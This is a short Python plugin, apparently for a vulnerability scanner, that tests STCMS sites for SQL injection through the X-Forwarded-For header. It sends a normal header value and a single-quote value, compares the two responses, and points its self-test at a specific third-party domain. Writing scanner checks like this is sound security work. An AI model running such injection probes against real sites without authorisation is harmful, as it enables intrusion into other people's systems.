#!/usr/bin/env python
#-*- conding:utf-8 -*-
#__Author:tsplay
#__Refer:WooYun-2015-97659
#__SerType:STCMS X-Forwarded-For SQL-Injection
import re
def assign(service,arg):
    if service  == "stcms":
        return True, arg

def audit(arg):
    header = ["X-Forwarded-For:1",
              "X-Forwarded-For:1'",
             ]
    uris = ('music_rl/','')
    for uri in uris:
        target = arg + uri
        code, head, body, errcode, _url = curl.curl2(target,header=header[0])
        code1, head1, body1, errcode1, _url1 = curl.curl2(target,header=header[1])
        if code == 200 and 'login' in body and code1 == 200 and 'login' not in body1:
            security_hole("X-Forwarded-For SQLI:"+target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('stcms','http://music.hmr12.com/')[1])